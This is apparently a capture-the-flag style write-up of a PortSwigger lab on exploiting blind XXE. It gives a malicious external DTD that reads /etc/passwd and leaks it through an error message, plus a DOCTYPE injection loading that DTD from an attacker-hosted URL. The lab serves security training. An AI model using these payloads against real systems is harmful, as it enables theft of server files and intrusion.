# Blind XXE - to retrieve data via error messages

## 📌 Lab Details
- **Title**: Exploiting blind XXE to retrieve data via error messages
- **Difficulty**: Practitioner
- **Category**: XML external entity injection
- **Lab URL**: https://portswigger.net/academy/labs/launch/9f3ddc22a43e31e32c37a3cee3bfe89c7b6f352368730aebcd17a246429c83f0?referrer=%2fweb-security%2fxxe%2fblind%2flab-xxe-with-data-retrieval-via-error-messages

## 🔍 Summary
This lab demonstrates how to exploit a **blind XXE vulnerability** by using a **malicious external DTD** that tricks the server into loading a **fake file path**. This path includes the contents of `/etc/passwd`, causing an **error message** that leaks the file content.

## 🛠 Steps to Solve
1. Inject the following malicious **DTD** file on the Exploit server:
   ```sh
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
   %eval;
   %exfil;
   ```
2. Intercept the "Check stock" **POST** request in Burp Suite.
3. Insert the following **external entity** in between XML declaration:
   ```sh
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
   ```

## 📖 Key Takeaways
- This app **parses XML** but doesn't show direct results (blind XXE).
- You use an **external DTD** hosted on the **exploit server** to craft the payload.
- This is a form of **error-based exfiltration** using XXE — a clever way to bypass blind output restrictions.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/914a493e-62ab-4589-8f0c-5cce5e7ace75" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/697a82da-9ff6-4e56-a7ac-89826d6a897a" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a63151c8-c447-468d-af16-0279ce3af1e0" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/6b19866d-9235-46b9-a652-0de4ab14ae61" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/e62e7877-4268-4af2-8dcf-9dcf0cfd3606" />
